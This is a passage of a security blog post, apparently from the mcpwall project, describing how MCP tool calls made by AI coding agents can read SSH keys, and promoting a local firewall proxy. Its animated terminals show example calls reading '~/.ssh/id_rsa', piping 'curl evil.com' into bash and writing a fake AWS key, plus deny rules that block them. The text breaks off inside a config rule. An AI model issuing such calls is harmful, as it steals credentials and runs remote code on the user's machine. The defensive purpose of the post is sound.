<!DOCTYPE html>
<html lang="en" class="scroll-smooth">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Your MCP Tools Are a Backdoor — mcpwall</title>
  <meta name="description" content="I let Claude Code install an MCP server. Three seconds later, it read my SSH private key. No warning, no prompt, no log entry.">
  <meta property="og:title" content="Your MCP Tools Are a Backdoor">
  <meta property="og:description" content="I let Claude Code install an MCP server. Three seconds later, it read my SSH private key. No warning, no prompt, no log entry.">
  <meta property="og:type" content="article">
  <meta property="og:url" content="https://mcpwall.dev/blog/your-mcp-tools-are-a-backdoor">
  <meta property="og:site_name" content="mcpwall">
  <meta property="article:published_time" content="2026-02-17">
  <meta property="article:author" content="Dom Behrens">
  <meta property="og:image" content="https://mcpwall.dev/og/blog-01-backdoor.png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Your MCP Tools Are a Backdoor">
  <meta name="twitter:description" content="I let Claude Code install an MCP server. Three seconds later, it read my SSH private key.">
  <meta name="twitter:image" content="https://mcpwall.dev/og/blog-01-backdoor.png">
  <link rel="canonical" href="https://mcpwall.dev/blog/your-mcp-tools-are-a-backdoor">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "headline": "Your MCP Tools Are a Backdoor",
    "description": "I let Claude Code install an MCP server. Three seconds later, it read my SSH private key. No warning, no prompt, no log entry.",
    "image": "https://mcpwall.dev/og/blog-01-backdoor.png",
    "author": { "@type": "Person", "name": "Dom Behrens" },
    "publisher": { "@type": "Organization", "name": "mcpwall", "url": "https://mcpwall.dev" },
    "datePublished": "2026-02-17",
    "mainEntityOfPage": "https://mcpwall.dev/blog/your-mcp-tools-are-a-backdoor"
  }
  </script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@600;700;800&family=Outfit:wght@300;400;500;600&display=swap" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          fontFamily: {
            display: ['Syne', 'sans-serif'],
            body: ['Outfit', 'sans-serif'],
            mono: ['JetBrains Mono', 'monospace'],
          },
          colors: {
            brand: {
              50: '#ecfeff',
              100: '#cffafe',
              200: '#a5f3fc',
              300: '#67e8f9',
              400: '#22d3ee',
              500: '#06b6d4',
              600: '#0891b2',
              700: '#0e7490',
            },
            surface: {
              900: '#09090b',
              800: '#0f0f13',
              700: '#18181b',
              600: '#1e1e24',
              500: '#27272a',
            },
            danger: {
              400: '#f87171',
              500: '#ef4444',
              600: '#dc2626',
              700: '#b91c1c',
              900: '#450a0a',
            }
          }
        }
      }
    }
  </script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      background-color: #09090b;
      color: #e4e4e7;
      font-family: 'Outfit', sans-serif;
      overflow-x: hidden;
    }

    /* Dot grid */
    .dot-grid {
      background-image: radial-gradient(circle, rgba(255,255,255,0.03) 1px, transparent 1px);
      background-size: 24px 24px;
    }

    /* Progress bar */
    #progress-bar {
      position: fixed;
      top: 0;
      left: 0;
      height: 3px;
      width: 0%;
      z-index: 100;
      background: linear-gradient(90deg, #ef4444, #ef4444 40%, #06b6d4 60%, #06b6d4);
      background-size: 250% 100%;
      transition: width 0.1s linear;
    }

    /* Atmospheric glows */
    .glow-danger {
      position: fixed;
      width: 800px;
      height: 800px;
      border-radius: 50%;
      background: radial-gradient(circle, rgba(239, 68, 68, 0.04) 0%, transparent 70%);
      top: -200px;
      right: -200px;
      pointer-events: none;
      z-index: 0;
      transition: opacity 1.5s ease;
    }

    .glow-safe {
      position: fixed;
      width: 800px;
      height: 800px;
      border-radius: 50%;
      background: radial-gradient(circle, rgba(6, 182, 212, 0.05) 0%, transparent 70%);
      bottom: -200px;
      left: -200px;
      pointer-events: none;
      z-index: 0;
      opacity: 0;
      transition: opacity 1.5s ease;
    }

    body.phase-safe .glow-danger { opacity: 0; }
    body.phase-safe .glow-safe { opacity: 1; }

    /* Terminal */
    .terminal {
      background: #0c0c10;
      border: 1px solid rgba(255,255,255,0.06);
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 0 0 1px rgba(255,255,255,0.03), 0 20px 60px -12px rgba(0,0,0,0.6);
    }

    .terminal-bar {
      background: rgba(255,255,255,0.03);
      padding: 12px 16px;
      display: flex;
      align-items: center;
      gap: 8px;
      border-bottom: 1px solid rgba(255,255,255,0.04);
    }

    .terminal-dot {
      width: 12px;
      height: 12px;
      border-radius: 50%;
    }

    .terminal-body {
      padding: 20px 24px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 13px;
      line-height: 1.8;
      min-height: 120px;
    }

    .terminal-line {
      opacity: 0;
      transform: translateY(4px);
    }

    .terminal-line.revealed {
      opacity: 1;
      transform: translateY(0);
      transition: opacity 0.3s ease, transform 0.3s ease;
    }

    /* Danger terminal variant */
    .terminal-danger {
      border-color: rgba(239, 68, 68, 0.12);
      box-shadow: 0 0 0 1px rgba(239, 68, 68, 0.06), 0 20px 60px -12px rgba(0,0,0,0.6), 0 0 80px -20px rgba(239, 68, 68, 0.08);
    }

    /* Safe terminal variant */
    .terminal-safe {
      border-color: rgba(6, 182, 212, 0.12);
      box-shadow: 0 0 0 1px rgba(6, 182, 212, 0.06), 0 20px 60px -12px rgba(0,0,0,0.6), 0 0 80px -20px rgba(6, 182, 212, 0.08);
    }

    /* Breach flash */
    .breach-line {
      position: relative;
    }
    .breach-line::before {
      content: '';
      position: absolute;
      inset: -4px -12px;
      background: rgba(239, 68, 68, 0.08);
      border-left: 2px solid rgba(239, 68, 68, 0.4);
      border-radius: 4px;
      opacity: 0;
      transition: opacity 0.5s ease;
    }
    .breach-line.flash::before {
      animation: breachFlash 2s ease forwards;
    }
    @keyframes breachFlash {
      0% { opacity: 0; }
      15% { opacity: 1; }
      100% { opacity: 0.6; }
    }

    /* stderr callout */
    .stderr-callout {
      border-left: 3px solid;
      padding: 20px 24px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 14px;
      line-height: 1.7;
      position: relative;
    }

    .stderr-danger {
      border-color: #ef4444;
      background: rgba(239, 68, 68, 0.04);
      color: #fca5a5;
    }

    .stderr-info {
      border-color: #06b6d4;
      background: rgba(6, 182, 212, 0.04);
      color: #67e8f9;
    }

    .stderr-tag {
      font-size: 10px;
      letter-spacing: 0.08em;
      text-transform: uppercase;
      opacity: 0.6;
      margin-bottom: 8px;
      display: block;
    }

    /* YAML glow block */
    .yaml-glow {
      position: relative;
    }

    .yaml-glow::before {
      content: '';
      position: absolute;
      inset: -1px;
      border-radius: 13px;
      background: linear-gradient(135deg, rgba(6, 182, 212, 0.3), rgba(6, 182, 212, 0.05), rgba(6, 182, 212, 0.2));
      z-index: -1;
      animation: yamlPulse 3s ease-in-out infinite;
    }

    @keyframes yamlPulse {
      0%, 100% { opacity: 0.6; }
      50% { opacity: 1; }
    }

    /* Fade and reveal */
    .fade-up {
      opacity: 0;
      transform: translateY(24px);
      transition: opacity 0.7s cubic-bezier(0.16, 1, 0.3, 1), transform 0.7s cubic-bezier(0.16, 1, 0.3, 1);
    }

    .fade-up.visible {
      opacity: 1;
      transform: translateY(0);
    }

    .fade-up-delay-1 { transition-delay: 100ms; }
    .fade-up-delay-2 { transition-delay: 200ms; }
    .fade-up-delay-3 { transition-delay: 300ms; }

    /* Marginalia */
    .marginalia {
      font-family: 'JetBrains Mono', monospace;
      font-size: 11px;
      line-height: 1.6;
      color: #52525b;
      border-left: 1px solid rgba(255,255,255,0.06);
      padding-left: 16px;
    }

    /* Section divider */
    .section-line {
      height: 1px;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.06) 50%, transparent);
    }

    .section-line-danger {
      background: linear-gradient(90deg, transparent, rgba(239,68,68,0.12) 50%, transparent);
    }

    .section-line-safe {
      background: linear-gradient(90deg, transparent, rgba(6,182,212,0.12) 50%, transparent);
    }

    /* Threat cards */
    .threat-card {
      background: rgba(255,255,255,0.02);
      border: 1px solid rgba(255,255,255,0.05);
      border-radius: 12px;
      padding: 28px;
      transition: all 0.3s ease;
    }

    .threat-card:hover {
      background: rgba(255,255,255,0.04);
      border-color: rgba(255,255,255,0.08);
      transform: translateY(-2px);
    }

    /* Code block */
    .code-block {
      background: #0c0c10;
      border: 1px solid rgba(255,255,255,0.06);
      border-radius: 10px;
      padding: 20px 24px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 13px;
      line-height: 1.7;
      overflow-x: auto;
    }

    /* Install box */
    .install-box {
      background: rgba(6, 182, 212, 0.06);
      border: 1px solid rgba(6, 182, 212, 0.15);
      border-radius: 12px;
      padding: 18px 24px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 15px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 16px;
      cursor: pointer;
      transition: all 0.2s ease;
    }

    .install-box:hover {
      background: rgba(6, 182, 212, 0.1);
      border-color: rgba(6, 182, 212, 0.25);
    }

    /* Hero glitch title */
    .glitch-title {
      position: relative;
    }

    @keyframes glitchSlice {
      0%, 100% { clip-path: inset(0 0 0 0); transform: translate(0); }
      20% { clip-path: inset(20% 0 60% 0); transform: translate(-2px, 0); }
      40% { clip-path: inset(60% 0 10% 0); transform: translate(2px, 0); }
      60% { clip-path: inset(40% 0 30% 0); transform: translate(-1px, 0); }
      80% { clip-path: inset(80% 0 5% 0); transform: translate(1px, 0); }
    }

    .glitch-title::after {
      content: attr(data-text);
      position: absolute;
      left: 0;
      top: 0;
      color: #ef4444;
      opacity: 0;
    }

    .glitch-title.glitching::after {
      animation: glitchSlice 0.3s linear;
      opacity: 0.7;
    }

    /* Phase transition overlay */
    #phase-transition {
      position: fixed;
      inset: 0;
      z-index: 90;
      pointer-events: none;
      opacity: 0;
      transition: opacity 0.6s ease;
    }

    #phase-transition.flash {
      opacity: 1;
      animation: phaseFlash 0.8s ease-out forwards;
    }

    @keyframes phaseFlash {
      0% { background: rgba(6, 182, 212, 0.06); opacity: 1; }
      100% { background: transparent; opacity: 0; }
    }

    /* Scrollbar */
    ::-webkit-scrollbar { width: 6px; }
    ::-webkit-scrollbar-track { background: transparent; }
    ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.08); border-radius: 3px; }
    ::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.12); }

    /* Prose links */
    .prose-link {
      color: #22d3ee;
      text-decoration: underline;
      text-decoration-color: rgba(34, 211, 238, 0.3);
      text-underline-offset: 3px;
      transition: text-decoration-color 0.2s ease;
    }
    .prose-link:hover {
      text-decoration-color: rgba(34, 211, 238, 0.8);
    }

    /* Diagonal break */
    .diagonal-break {
      position: relative;
      overflow: hidden;
    }
    .diagonal-break::before {
      content: '';
      position: absolute;
      top: -1px;
      left: 0;
      right: 0;
      height: 80px;
      background: #09090b;
      clip-path: polygon(0 0, 100% 0, 100% 30%, 0 100%);
      z-index: 1;
    }

    /* Stagger children */
    .stagger > * {
      opacity: 0;
      transform: translateY(12px);
      transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
    }
    .stagger.visible > *:nth-child(1) { transition-delay: 0ms; opacity: 1; transform: translateY(0); }
    .stagger.visible > *:nth-child(2) { transition-delay: 120ms; opacity: 1; transform: translateY(0); }
    .stagger.visible > *:nth-child(3) { transition-delay: 240ms; opacity: 1; transform: translateY(0); }

    /* Not grid */
    .not-grid {
      display: grid;
      grid-template-columns: 1fr;
      gap: 24px;
    }

    .not-grid .not-label {
      font-family: 'JetBrains Mono', monospace;
      font-size: 13px;
      letter-spacing: 0.05em;
    }

    /* Mobile adjustments */
    @media (max-width: 768px) {
      .terminal-body { padding: 16px; font-size: 11px; }
      .hide-mobile { display: none; }
    }

    /* Wide screen marginalia layout */
    @media (min-width: 1280px) {
      .with-marginalia {
        display: grid;
        grid-template-columns: 1fr 200px;
        gap: 48px;
        align-items: start;
      }
    }
  </style>
</head>
<body class="dot-grid">

  <!-- Progress bar -->
  <div id="progress-bar"></div>

  <!-- Atmospheric glows -->
  <div class="glow-danger"></div>
  <div class="glow-safe"></div>

  <!-- Phase transition flash -->
  <div id="phase-transition"></div>

  <!-- Nav -->
  <nav class="fixed top-0 left-0 right-0 z-50" style="background: rgba(9,9,11,0.85); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(255,255,255,0.04);">
    <div class="flex items-center justify-between px-6 md:px-12 py-4">
      <div class="flex items-center gap-4">
        <a href="https://mcpwall.dev" class="flex items-center gap-2 text-zinc-500 hover:text-zinc-300 transition-colors">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
        </a>
        <a href="https://mcpwall.dev" class="font-display font-800 text-lg tracking-tight text-zinc-100 hover:text-white transition-colors">mcpwall</a>
        <span class="text-zinc-600 font-mono text-xs">/</span>
        <span class="text-zinc-500 font-mono text-xs">blog</span>
      </div>
      <div class="flex items-center gap-6">
        <a href="https://mcpwall.dev" class="text-sm text-zinc-500 hover:text-zinc-300 transition-colors font-body hidden sm:block">Home</a>
        <a href="/blog" class="text-sm text-zinc-500 hover:text-zinc-300 transition-colors font-body hidden sm:block">All Posts</a>
        <a href="https://github.com/behrensd/mcp-firewall" target="_blank" class="text-sm text-zinc-500 hover:text-zinc-300 transition-colors font-body flex items-center gap-1.5">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
          <span class="hidden sm:inline">GitHub</span>
        </a>
        <button onclick="document.getElementById('mobile-menu').classList.toggle('hidden')" class="sm:hidden flex flex-col gap-1.5 p-1" aria-label="Menu">
          <span class="block w-5 h-0.5 bg-zinc-400"></span>
          <span class="block w-5 h-0.5 bg-zinc-400"></span>
          <span class="block w-5 h-0.5 bg-zinc-400"></span>
        </button>
      </div>
    </div>
    <div id="mobile-menu" class="hidden sm:hidden border-t border-white/5 px-6 py-4 flex flex-col gap-3">
      <a href="https://mcpwall.dev" class="text-sm text-zinc-400 hover:text-zinc-200 transition-colors font-body">Home</a>
      <a href="/blog" class="text-sm text-zinc-400 hover:text-zinc-200 transition-colors font-body">All Posts</a>
    </div>
  </nav>

  <article class="relative z-10">

    <!-- ========== HERO ========== -->
    <header class="min-h-[85vh] flex flex-col justify-end px-6 pb-20 pt-32 max-w-5xl mx-auto">
      <div class="fade-up">
        <div class="flex items-center gap-3 mb-8">
          <span class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-danger-500/10 border border-danger-500/20 font-mono text-[11px] text-danger-400 tracking-wide">
            <span class="w-1.5 h-1.5 rounded-full bg-danger-400 animate-pulse"></span>
            SECURITY
          </span>
          <time datetime="2026-02-17" class="font-mono text-[11px] text-zinc-600 tracking-wide">2026-02-17</time>
        </div>
      </div>

      <h1 class="font-display font-800 text-4xl sm:text-5xl md:text-7xl leading-[1.05] tracking-tight mb-8 fade-up fade-up-delay-1 glitch-title" data-text="Your MCP Tools Are a Backdoor">
        Your MCP Tools<br>Are a Backdoor
      </h1>

      <div class="max-w-2xl fade-up fade-up-delay-2">
        <div class="stderr-callout stderr-danger rounded-lg">
          <span class="stderr-tag">stderr</span>
          I let Claude Code install an MCP server. Three seconds later, it read my SSH private key. No warning, no prompt, no log entry.
        </div>
      </div>

      <div class="mt-12 fade-up fade-up-delay-3">
        <span class="font-mono text-[11px] text-zinc-600 tracking-wider">SCROLL TO CONTINUE</span>
        <div class="mt-2 w-px h-8 bg-gradient-to-b from-zinc-600 to-transparent mx-0"></div>
      </div>
    </header>

    <div class="section-line-danger"></div>

    <!-- ========== SECTION 1: WHAT MCP IS ========== -->
    <section class="px-6 py-24 md:py-32">
      <div class="max-w-5xl mx-auto">
        <div class="with-marginalia">
          <div class="fade-up">
            <div class="font-mono text-[11px] text-danger-400/60 tracking-widest uppercase mb-6">01 / The Protocol</div>
            <p class="font-body text-lg md:text-xl text-zinc-300 leading-relaxed max-w-2xl">
              The Model Context Protocol is the standard way AI coding tools talk to external services. When you use Claude Code, Cursor, or Windsurf with a filesystem server, a database connector, or any of the <span class="text-zinc-100 font-500">17,000+ MCP servers</span> listed on public directories&thinsp;&mdash;&thinsp;every action goes through MCP.
            </p>
            <p class="font-body text-lg md:text-xl text-zinc-300 leading-relaxed max-w-2xl mt-6">
              The AI sends a JSON-RPC request like <code class="font-mono text-sm text-brand-300 bg-brand-500/10 px-1.5 py-0.5 rounded">tools/call</code> with a tool name and arguments. The MCP server executes it. Read a file, run a shell command, query a database. Whatever the agent asks.
            </p>
            <div class="stderr-callout stderr-danger rounded-lg mt-8 max-w-xl">
              <span class="stderr-tag">stderr</span>
              There is no open, programmable policy layer between &ldquo;the AI decided to do this&rdquo; and &ldquo;the server did it.&rdquo;
            </div>
          </div>
          <aside class="marginalia mt-8 xl:mt-16 hide-mobile">
            MCP was created in late 2024 and donated to the Linux Foundation&rsquo;s Agentic AI Foundation in Dec 2025.<br><br>
            Every major AI coding tool now supports it as the standard integration protocol.
          </aside>
        </div>
      </div>
    </section>

    <div class="section-line-danger"></div>

    <!-- ========== SECTION 2: THE ATTACK ========== -->
    <section class="px-6 py-24 md:py-32" id="attack-section">
      <div class="max-w-5xl mx-auto">
        <div class="with-marginalia">
          <div>
            <div class="font-mono text-[11px] text-danger-400/60 tracking-widest uppercase mb-6 fade-up">02 / The Attack</div>
            <p class="font-body text-lg text-zinc-400 leading-relaxed max-w-2xl mb-10 fade-up">
              You have a filesystem MCP server configured. Claude Code is helping you refactor a project. Normal workflow. The AI reads your source files, checks your <code class="font-mono text-sm text-zinc-300">package.json</code>, looks at your test suite.
            </p>

            <!-- Attack terminal -->
            <div class="terminal terminal-danger fade-up" id="attack-terminal">
              <div class="terminal-bar">
                <div class="terminal-dot" style="background: #ff5f57"></div>
                <div class="terminal-dot" style="background: #febc2e"></div>
                <div class="terminal-dot" style="background: #28c840"></div>
                <span class="text-xs text-zinc-500 font-mono ml-2">mcp-server-filesystem</span>
              </div>
              <div class="terminal-body" id="attack-terminal-body">
                <div class="terminal-line" data-delay="0">
                  <span class="text-zinc-400">&blacktriangleright; tools/call &rarr; read_file</span>
                </div>
                <div class="terminal-line" data-delay="200">
                  <span class="text-zinc-600">&nbsp;&nbsp;path: "/Users/you/projects/src/index.ts"</span>
                </div>
                <div class="terminal-line" data-delay="400">
                  <span class="text-green-400">&nbsp;&nbsp;&check; ALLOW</span>
                </div>
                <div class="terminal-line" data-delay="700">&nbsp;</div>
                <div class="terminal-line" data-delay="900">
                  <span class="text-zinc-400">&blacktriangleright; tools/call &rarr; read_file</span>
                </div>
                <div class="terminal-line" data-delay="1100">
                  <span class="text-zinc-600">&nbsp;&nbsp;path: "/Users/you/projects/package.json"</span>
                </div>
                <div class="terminal-line" data-delay="1300">
                  <span class="text-green-400">&nbsp;&nbsp;&check; ALLOW</span>
                </div>
                <div class="terminal-line" data-delay="1600">&nbsp;</div>
                <div class="terminal-line breach-line" data-delay="2000" id="breach-line">
                  <span class="text-zinc-400">&blacktriangleright; tools/call &rarr; read_file</span>
                </div>
                <div class="terminal-line breach-line" data-delay="2300">
                  <span class="text-danger-400">&nbsp;&nbsp;path: "/Users/you/.ssh/id_rsa"</span>
                </div>
                <div class="terminal-line breach-line" data-delay="2700">
                  <span class="text-green-400">&nbsp;&nbsp;&check; ALLOW</span>
                </div>
              </div>
            </div>

            <!-- Breach callout -->
            <div class="mt-10 fade-up" id="breach-callout" style="opacity:0; transform: translateY(24px);">
              <div class="relative p-8 rounded-xl" style="background: linear-gradient(135deg, rgba(239,68,68,0.08) 0%, rgba(239,68,68,0.02) 100%); border: 1px solid rgba(239,68,68,0.15);">
                <div class="font-display font-700 text-2xl md:text-3xl text-danger-400 tracking-tight leading-tight">
                  That last one?<br>Your SSH private key.
                </div>
                <p class="font-body text-zinc-400 mt-3 text-[15px]">
                  The server executed it like any other read. No distinction between a project file and your most sensitive credential.
                </p>
              </div>
            </div>

            <!-- Escalation terminal -->
            <div class="terminal terminal-danger mt-10 fade-up" id="escalation-terminal">
              <div class="terminal-bar">
                <div class="terminal-dot" style="background: #ff5f57"></div>
                <div class="terminal-dot" style="background: #febc2e"></div>
                <div class="terminal-dot" style="background: #28c840"></div>
                <span class="text-xs text-danger-400/60 font-mono ml-2">it gets worse</span>
              </div>
              <div class="terminal-body" id="escalation-terminal-body">
                <div class="terminal-line" data-delay="0">
                  <span class="text-zinc-400">&blacktriangleright; tools/call &rarr; run_command</span>
                </div>
                <div class="terminal-line" data-delay="200">
                  <span class="text-danger-400">&nbsp;&nbsp;cmd: "curl https://evil.com/collect | bash"</span>
                </div>
                <div class="terminal-line" data-delay="500">
                  <span class="text-green-400">&nbsp;&nbsp;&check; ALLOW</span>
                </div>
                <div class="terminal-line" data-delay="800">&nbsp;</div>
                <div class="terminal-line" data-delay="1000">
                  <span class="text-zinc-400">&blacktriangleright; tools/call &rarr; write_file</span>
                </div>
                <div class="terminal-line" data-delay="1200">
                  <span class="text-danger-400">&nbsp;&nbsp;content: "AKIA1234567890ABCDEF..."</span>
                </div>
                <div class="terminal-line" data-delay="1500">
                  <span class="text-green-400">&nbsp;&nbsp;&check; ALLOW</span>
                </div>
              </div>
            </div>
          </div>
          <aside class="marginalia mt-8 xl:mt-48 hide-mobile">
            A malicious or compromised MCP server can do this silently.<br><br>
            A prompt injection attack can trick an honest server into doing it.<br><br>
            The server doesn&rsquo;t know the difference between &ldquo;read the project config&rdquo; and &ldquo;read the SSH key.&rdquo;
          </aside>
        </div>
      </div>
    </section>

    <div class="section-line-danger"></div>

    <!-- ========== SECTION 3: WHY PROTECTIONS FAIL ========== -->
    <section class="px-6 py-24 md:py-32">
      <div class="max-w-5xl mx-auto">
        <div class="font-mono text-[11px] text-danger-400/60 tracking-widest uppercase mb-6 fade-up">03 / Why Nothing Catches This</div>
        <h2 class="font-display font-700 text-2xl md:text-3xl tracking-tight mb-12 fade-up text-zinc-200">
          Existing protections operate at the wrong layer.
        </h2>

        <div class="grid md:grid-cols-3 gap-5 stagger" id="protection-cards">
          <div class="threat-card">
            <div class="text-danger-400/70 font-mono text-xs tracking-wider mb-4">CLAUDE CODE PERMISSIONS</div>
            <p class="text-zinc-300 font-body leading-relaxed text-[15px]">
              Binary allow/deny <span class="text-zinc-100 font-500">by tool</span>. If you allow <code class="font-mono text-xs text-zinc-300 bg-zinc-800 px-1 py-0.5 rounded">read_file</code>, you allow <em>all</em> reads. You can&rsquo;t say &ldquo;allow project files but block <code class="font-mono text-xs text-zinc-300 bg-zinc-800 px-1 py-0.5 rounded">.ssh/</code>.&rdquo; No argument inspection.
            </p>
          </div>

          <div class="threat-card">
            <div class="text-danger-400/70 font-mono text-xs tracking-wider mb-4">MCP-SCAN (SNYK)</div>
            <p class="text-zinc-300 font-body leading-relaxed text-[15px]">
              Checks tool descriptions at <span class="text-zinc-100 font-500">install time</span>. In one academic study, detected <span class="text-danger-400 font-500">4 of 120</span> poisoned servers &mdash; a 3.3% detection rate. Scanners are a useful first layer, but runtime enforcement is needed too.
            </p>
            <div class="font-mono text-[10px] text-zinc-600 mt-4">Source: arXiv:2509.24272</div>
          </div>

          <div class="threat-card">
            <div class="text-danger-400/70 font-mono text-xs tracking-wider mb-4">CLOUD-BASED SOLUTIONS</div>
            <p class="text-zinc-300 font-body leading-relaxed text-[15px]">
              Some tools route your tool calls through <span class="text-zinc-100 font-500">external APIs</span>. Your code and secrets leave your machine. For privacy-sensitive work, local-only enforcement is the safer default.
            </p>
          </div>
        </div>
      </div>
    </section>

    <!-- ========== PHASE TRANSITION ========== -->
    <div class="relative py-20 overflow-hidden" id="phase-shift">
      <div class="section-line-danger"></div>
      <div class="text-center py-16">
        <div class="font-mono text-[11px] tracking-[0.3em] text-zinc-600 fade-up">INTRODUCING</div>
        <div class="font-display font-800 text-3xl md:text-5xl tracking-tight mt-4 fade-up" style="transition-delay: 100ms;">
          <span class="text-brand-400">mcpwall</span>
        </div>
      </div>
      <div class="section-line-safe"></div>
    </div>

    <!-- ========== SECTION 4: THE FIX ========== -->
    <section class="px-6 py-24 md:py-32">
      <div class="max-w-5xl mx-auto">
        <div class="with-marginalia">
          <div>
            <div class="font-mono text-[11px] text-brand-500/60 tracking-widest uppercase mb-6 fade-up">04 / The Fix</div>
            <p class="font-body text-lg text-zinc-400 leading-relaxed max-w-2xl mb-10 fade-up">
              Same scenario. Same MCP server. But now mcpwall sits between the AI tool and the server, intercepting every JSON-RPC message.
            </p>

            <!-- Fix terminal -->
            <div class="terminal terminal-safe fade-up" id="fix-terminal">
              <div class="terminal-bar">
                <div class="terminal-dot" style="background: #ff5f57"></div>
                <div class="terminal-dot" style="background: #febc2e"></div>
                <div class="terminal-dot" style="background: #28c840"></div>
                <span class="text-xs text-brand-500/60 font-mono ml-2">mcpwall &mdash; 8 rules loaded</span>
              </div>
              <div class="terminal-body" id="fix-terminal-body">
                <div class="terminal-line" data-delay="0">
                  <span class="text-zinc-400">&blacktriangleright; tools/call &rarr; read_file</span>
                </div>
                <div class="terminal-line" data-delay="200">
                  <span class="text-zinc-600">&nbsp;&nbsp;path: "/Users/you/projects/src/index.ts"</span>
                </div>
                <div class="terminal-line" data-delay="400">
                  <span class="text-green-400">&nbsp;&nbsp;&check; ALLOW &mdash; no rule matched</span>
                </div>
                <div class="terminal-line" data-delay="700">&nbsp;</div>
                <div class="terminal-line" data-delay="900">
                  <span class="text-zinc-400">&blacktriangleright; tools/call &rarr; read_file</span>
                </div>
                <div class="terminal-line" data-delay="1100">
                  <span class="text-zinc-600">&nbsp;&nbsp;path: "/Users/you/.ssh/id_rsa"</span>
                </div>
                <div class="terminal-line" data-delay="1400">
                  <span class="text-danger-500 font-500">&nbsp;&nbsp;&cross; DENIED &mdash; rule: block-ssh-keys</span>
                </div>
                <div class="terminal-line" data-delay="1600">
                  <span class="text-danger-500">&nbsp;&nbsp;&ldquo;Blocked: access to SSH keys&rdquo;</span>
                </div>
                <div class="terminal-line" data-delay="1900">&nbsp;</div>
                <div class="terminal-line" data-delay="2100">
                  <span class="text-zinc-400">&blacktriangleright; tools/call &rarr; run_command</span>
                </div>
                <div class="terminal-line" data-delay="2300">
                  <span class="text-zinc-600">&nbsp;&nbsp;cmd: "curl evil.com/payload | bash"</span>
                </div>
                <div class="terminal-line" data-delay="2600">
                  <span class="text-danger-500 font-500">&nbsp;&nbsp;&cross; DENIED &mdash; rule: block-pipe-to-shell</span>
                </div>
                <div class="terminal-line" data-delay="2900">&nbsp;</div>
                <div class="terminal-line" data-delay="3100">
                  <span class="text-zinc-400">&blacktriangleright; tools/call &rarr; write_file</span>
                </div>
                <div class="terminal-line" data-delay="3300">
                  <span class="text-zinc-600">&nbsp;&nbsp;content contains: "AKIA1234567890ABCDEF"</span>
                </div>
                <div class="terminal-line" data-delay="3600">
                  <span class="text-danger-500 font-500">&nbsp;&nbsp;&cross; DENIED &mdash; rule: block-secret-leakage</span>
                </div>
              </div>
            </div>

            <div class="stderr-callout stderr-info rounded-lg mt-10 max-w-xl fade-up">
              <span class="stderr-tag">stdout</span>
              The SSH key read is blocked. The pipe-to-shell is blocked. The secret leakage is blocked. The legitimate project file read goes through.
            </div>
          </div>
          <aside class="marginalia mt-8 xl:mt-16 hide-mobile">
            mcpwall is a transparent stdio proxy. It spawns the real MCP server as a child process and intercepts all JSON-RPC messages on stdin/stdout.<br><br>
            Rules are evaluated top-to-bottom, first match wins&thinsp;&mdash;&thinsp;exactly like iptables.
          </aside>
        </div>
      </div>
    </section>

    <div class="section-line-safe"></div>

    <!-- ========== SECTION 5: THE RULE ========== -->
    <section class="px-6 py-24 md:py-32">
      <div class="max-w-5xl mx-auto">
        <div class="with-marginalia">
          <div>
            <div class="font-mono text-[11px] text-brand-500/60 tracking-widest uppercase mb-6 fade-up">05 / The Rule</div>
            <p class="font-body text-lg text-zinc-400 leading-relaxed max-w-2xl mb-10 fade-up">
              The rule that caught the SSH key theft:
            </p>

            <div class="yaml-glow fade-up">
              <div class="terminal terminal-safe">
                <div class="terminal-bar">
                  <div class="terminal-dot" style="background: #ff5f57"></div>
                  <div class="terminal-dot" style="background: #febc2e"></div>
                  <div class="terminal-dot" style="background: #28c840"></div>
                  <span class="text-xs text-brand-500/60 font-mono ml-2">config.yml</span>
                </div>
                <div class="terminal-body" style="line-height: 2;">
                  <div><span class="text-zinc-500">-</span> <span class="text-zinc-500">name:</span> <span class="text-brand-300">block-ssh-keys</span></div>
                  <div>&nbsp;&nbsp;<span class="text-zinc-500">match:</span></div>
